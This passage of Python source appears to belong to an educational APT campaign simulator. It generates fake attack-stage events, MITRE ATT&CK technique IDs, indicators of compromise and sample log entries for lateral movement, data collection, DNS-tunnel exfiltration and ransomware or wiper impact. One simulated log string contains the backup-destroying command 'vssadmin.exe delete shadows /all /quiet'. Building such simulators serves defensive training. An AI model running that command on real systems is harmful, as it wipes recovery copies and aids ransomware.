                if self._should_generate_log():
                    event.add_log_entry("Windows Security", "4624",
                                        f"Logon Type 3 (Network) from {source['ip']} as {cred['username']}")
                    event.add_log_entry("Windows Security", "5140",
                                        f"Network share {share} accessed from {source['ip']}")

            elif tech_id == "T1021.001":
                # RDP
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"RDP session from {source['hostname']} to {new_target['hostname']}",
                    new_target["hostname"],
                )
                if self._should_generate_log():
                    event.add_log_entry("Windows Security", "4624",
                                        f"Logon Type 10 (RemoteInteractive) from {source['ip']}")
                    event.add_log_entry("TerminalServices", "1149",
                                        f"RDP connection from {source['ip']}")
            else:
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Lateral movement via {tech['name']} from {source['hostname']} to {new_target['hostname']}",
                    new_target["hostname"],
                )

            new_target["compromised"] = True
            self.compromised_hosts.add(new_target["hostname"])
            self.events.append(event)
            count += 1

        return count

    def simulate_collection(self, targets):
        """Simulate data collection from compromised hosts."""
        stage = "collection"
        techniques = MITRE_TECHNIQUES[stage]
        compromised = [t for t in targets if t.get("compromised")]
        if not compromised:
            return 0

        count = 0
        for target in compromised[:3]:
            tech_id = random.choice(list(techniques.keys()))
            tech = techniques[tech_id]

            if tech_id == "T1005":
                collected_files = [
                    "C:\\Users\\admin\\Documents\\passwords.xlsx",
                    "C:\\Shares\\Finance\\budget_2024.xlsx",
                    "C:\\Shares\\HR\\employee_records.csv",
                    "C:\\Users\\admin\\Desktop\\vpn_config.ovpn",
                    "C:\\Projects\\source_code.zip",
                ]
                files = random.sample(collected_files, random.randint(2, 4))
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Collected {len(files)} sensitive files from {target['hostname']}",
                    target["hostname"],
                )
                for f in files:
                    event.add_ioc("collected_file", f)
            else:
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Data collection via {tech['name']} on {target['hostname']}",
                    target["hostname"],
                )

            self.events.append(event)
            count += 1

        return count

    def simulate_exfiltration(self, targets):
        """Simulate data exfiltration stage."""
        stage = "exfiltration"
        techniques = MITRE_TECHNIQUES[stage]

        tech_id = random.choice(list(techniques.keys()))
        tech = techniques[tech_id]

        c2_domain = self._gen_fake_domain()
        c2_ip = self._gen_fake_ip()
        data_size = random.randint(50, 5000)

        if tech_id == "T1048.003":
            # DNS tunneling exfiltration
            event = APTCampaignEvent(
                stage, tech_id, tech["name"],
                f"Exfiltrated {data_size}MB via DNS tunneling to {c2_domain}",
                random.choice(list(self.compromised_hosts)),
            )
            event.add_ioc("domain", c2_domain)
            event.add_ioc("exfil_size_mb", str(data_size))
            if self._should_generate_log():
                event.add_log_entry("DNS", "QUERY",
                                    f"Anomalous DNS queries: long subdomain labels to {c2_domain}")
                event.add_log_entry("IDS", "DNS-TUNNEL",
                                    f"Potential DNS tunneling detected: high query volume to {c2_domain}")
        else:
            event = APTCampaignEvent(
                stage, tech_id, tech["name"],
                f"Exfiltrated {data_size}MB via {tech['name']} to {c2_ip}",
                random.choice(list(self.compromised_hosts)),
            )
            event.add_ioc("ip", c2_ip)
            event.add_ioc("domain", c2_domain)

        self.events.append(event)
        return 1

    def simulate_impact(self, targets):
        """Simulate impact stage (ransomware, wiper, etc.)."""
        stage = "impact"
        techniques = MITRE_TECHNIQUES[stage]
        compromised = [t for t in targets if t.get("compromised")]
        if not compromised:
            return 0

        tech_id = random.choice(list(techniques.keys()))
        tech = techniques[tech_id]

        if tech_id == "T1486":
            # Ransomware
            ransom_note = random.choice([
                "YOUR_FILES_ARE_ENCRYPTED.txt", "RECOVER_YOUR_DATA.html",
                "README_TO_DECRYPT.txt", "HOW_TO_RESTORE.html",
            ])
            ext = random.choice([".locked", ".encrypted", ".darknode", ".crypt"])
            event = APTCampaignEvent(
                stage, tech_id, tech["name"],
                f"Deployed ransomware across {len(compromised)} hosts -- extension: {ext}, note: {ransom_note}",
                "ALL_COMPROMISED",
            )
            event.add_ioc("ransom_note", ransom_note)
            event.add_ioc("encrypted_extension", ext)
            event.add_ioc("file_hash_sha256", self._gen_fake_hash("ransomware_binary"))
            if self._should_generate_log():
                event.add_log_entry("Sysmon", "11",
                                    f"File created: {ransom_note} in multiple directories")
                event.add_log_entry("Sysmon", "1",
                                    "vssadmin.exe delete shadows /all /quiet")

        elif tech_id == "T1485":
            event = APTCampaignEvent(
                stage, tech_id, tech["name"],
                f"Deployed wiper malware across {len(compromised)} hosts",
                "ALL_COMPROMISED",
            )
            event.add_ioc("file_hash_sha256", self._gen_fake_hash("wiper_binary"))
            if self._should_generate_log():
                event.add_log_entry("Sysmon", "1",
                                    "Disk overwrite utility executed: raw disk access detected")
        else:
            event = APTCampaignEvent(
                stage, tech_id, tech["name"],
                f"Impact via {tech['name']} on {len(compromised)} hosts",
                "ALL_COMPROMISED",
            )

        self.events.append(event)
        return 1

    # ─── Campaign Orchestration ────────────────────────────────────────

    def run(self):
        """Execute the full APT campaign simulation."""
        self.start_time = datetime.datetime.now()

        console.print(Panel(
            f"[bold red]APT CAMPAIGN SIMULATION[/bold red]\n\n"
            f"Campaign ID:  {self.campaign_id}\n"
            f"APT Profile:  {self.apt_name}\n"
            f"Target Net:   {self.target_network}\n"
            f"Noise Level:  {self.noise_level} ({self.noise_config['description']})\n"
            f"Duration:     {self.duration_hours}h (simulated)\n"
            f"Started:      {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}",
            title="AEGIS APT Simulator",
            border_style="red",
        ))

        targets = self._generate_target_hosts(12)

        stages = [
            ("Initial Access", self.simulate_initial_access),
            ("Execution", self.simulate_execution),
            ("Persistence", self.simulate_persistence),
            ("Privilege Escalation", self.simulate_privilege_escalation),
            ("Defense Evasion", self.simulate_defense_evasion),
            ("Credential Access", self.simulate_credential_access),
            ("Lateral Movement", self.simulate_lateral_movement),
            ("Collection", self.simulate_collection),
            ("Exfiltration", self.simulate_exfiltration),
            ("Impact", self.simulate_impact),
        ]

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("Running APT Campaign...", total=len(stages))

            for stage_name, stage_func in stages:
                progress.update(task, description=f"[cyan]{stage_name}[/cyan]")
                event_count = stage_func(targets)
                progress.advance(task)

        self.end_time = datetime.datetime.now()
        self._display_results(targets)

    def _display_results(self, targets):
        """Display comprehensive campaign results."""
        # Summary panel
        total_iocs = sum(len(e.iocs) for e in self.events)
        total_logs = sum(len(e.log_entries) for e in self.events)

        console.print("\n")
        console.print(Panel(
            f"[bold green]CAMPAIGN COMPLETE[/bold green]\n\n"
            f"Total Events:          {len(self.events)}\n"
            f"Hosts Compromised:     {len(self.compromised_hosts)}\n"
            f"Credentials Harvested: {len(self.compromised_credentials)}\n"
            f"IOCs Generated:        {total_iocs}\n"
            f"Log Entries Created:   {total_logs}\n"
            f"MITRE Techniques Used: {len(set(e.technique_id for e in self.events))}",
            title="Campaign Summary",
            border_style="green",
        ))

        # Event timeline table
        table = Table(title="Campaign Timeline", show_lines=True)
        table.add_column("Time", style="dim", width=10)
        table.add_column("Stage", style="cyan", width=20)
        table.add_column("Technique", style="yellow", width=30)
        table.add_column("Target", style="green", width=12)
        table.add_column("Action", style="white", width=50)

        for event in self.events:
            table.add_row(
                event.timestamp.strftime("%H:%M:%S"),
                event.stage.replace("_", " ").title(),
                f"[bold]{event.technique_id}[/bold] {event.technique_name}",
                event.host,
                event.action[:50],
            )
        console.print(table)

        # MITRE ATT&CK coverage
        coverage_table = Table(title="MITRE ATT&CK Coverage")
        coverage_table.add_column("Tactic", style="cyan")
        coverage_table.add_column("Techniques Used", style="yellow")
        coverage_table.add_column("Count", style="green", justify="right")

        tactic_counts = defaultdict(list)
        for event in self.events:
            tactic_counts[event.stage].append(event.technique_id)

        for tactic, techs in tactic_counts.items():
            unique_techs = list(set(techs))
            coverage_table.add_row(
                tactic.replace("_", " ").title(),
                ", ".join(unique_techs),
                str(len(unique_techs)),
            )
        console.print(coverage_table)

        # Compromised credentials
        if self.compromised_credentials:
            cred_table = Table(title="Harvested Credentials")
            cred_table.add_column("Username", style="red")
            cred_table.add_column("Hash (simulated)", style="dim")
            cred_table.add_column("Source Host", style="cyan")
            cred_table.add_column("Type", style="yellow")

            for cred in self.compromised_credentials:
                cred_table.add_row(
                    cred["username"],
                    cred["hash"][:16] + "...",
                    cred["source"],
                    cred["type"],
                )
            console.print(cred_table)

    def generate_report(self, output_file=None):
        """Generate comprehensive JSON campaign report."""
        report = {
            "campaign_id": self.campaign_id,
            "apt_profile": self.apt_name,
            "target_network": self.target_network,
            "noise_level": self.noise_level,
            "duration_hours": self.duration_hours,
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "end_time": self.end_time.isoformat() if self.end_time else None,
            "summary": {
                "total_events": len(self.events),
                "hosts_compromised": len(self.compromised_hosts),
                "credentials_harvested": len(self.compromised_credentials),
                "techniques_used": len(set(e.technique_id for e in self.events)),
                "total_iocs": sum(len(e.iocs) for e in self.events),
            },
            "events": [e.to_dict() for e in self.events],
            "compromised_hosts": list(self.compromised_hosts),
            "compromised_credentials": self.compromised_credentials,
            "mitre_coverage": {
                stage: list(set(e.technique_id for e in self.events if e.stage == stage))
                for stage in set(e.stage for e in self.events)
            },
        }

        if output_file:
            with open(output_file, "w") as f:
                json.dump(report, f, indent=2)
            console.print(f"[green]Report exported to {output_file}[/green]")

        return report

    def export_iocs(self, output_file=None):
        """Export all generated IOCs in structured format."""
        all_iocs = []
        for event in self.events:
            for ioc in event.iocs:
                ioc["campaign_id"] = self.campaign_id
                ioc["technique_id"] = event.technique_id
                ioc["stage"] = event.stage
                all_iocs.append(ioc)

        if output_file:
            with open(output_file, "w") as f:
                json.dump(all_iocs, f, indent=2)
            console.print(f"[green]IOCs exported to {output_file} ({len(all_iocs)} indicators)[/green]")

        return all_iocs


def main():
    """Main entry point for the APT simulator."""
    parser = argparse.ArgumentParser(
        description="AEGIS APT Campaign Simulator -- Educational Use Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("command", nargs="?", default="simulate",
                        choices=["simulate", "list-profiles", "list-stages", "help"],
                        help="Command to execute")
    parser.add_argument("--profile", "-p", default=None,
                        choices=list(APT_PROFILES.keys()),
                        help="APT group profile to simulate")
    parser.add_argument("--target", "-t", default="10.0.0.0/24",
                        help="Target network CIDR (simulated)")
    parser.add_argument("--noise", "-n", default="balanced",
                        choices=list(NOISE_LEVELS.keys()),
                        help="Noise level of the campaign")
    parser.add_argument("--duration", "-d", type=int, default=72,
                        help="Simulated campaign duration in hours")
    parser.add_argument("--output", "-o", default=None,
                        help="Export report to JSON file")

    args = parser.parse_args()

    if args.command == "help":
        console.print(APTSimulator.HELP_TEXT)
        return

    if args.command == "list-profiles":
        table = Table(title="Available APT Profiles")
        table.add_column("Name", style="red bold")
        table.add_column("Aliases", style="yellow")
        table.add_column("Origin", style="cyan")
        table.add_column("Targets", style="green")
        table.add_column("Sophistication", style="magenta")

        for name, profile in APT_PROFILES.items():
            table.add_row(
                name,
                ", ".join(profile["aliases"]),
                profile["origin"],
                ", ".join(profile["targets"][:3]),
                profile["sophistication"],
            )
        console.print(table)
        return

    if args.command == "list-stages":
        tree = Tree("[bold]APT Campaign Stages[/bold]")
        for stage, techniques in MITRE_TECHNIQUES.items():
            branch = tree.add(f"[cyan]{stage.replace('_', ' ').title()}[/cyan]")
            for tid, tech in techniques.items():
                branch.add(f"[yellow]{tid}[/yellow] {tech['name']}")
        console.print(tree)
        return

    simulator = APTSimulator(
        target_network=args.target,
        noise_level=args.noise,
        apt_profile=args.profile,
        duration_hours=args.duration,
    )
    simulator.run()

    if args.output:
        simulator.generate_report(args.output)
        simulator.export_iocs(args.output.replace(".json", "_iocs.json"))


if __name__ == "__main__":
    main()
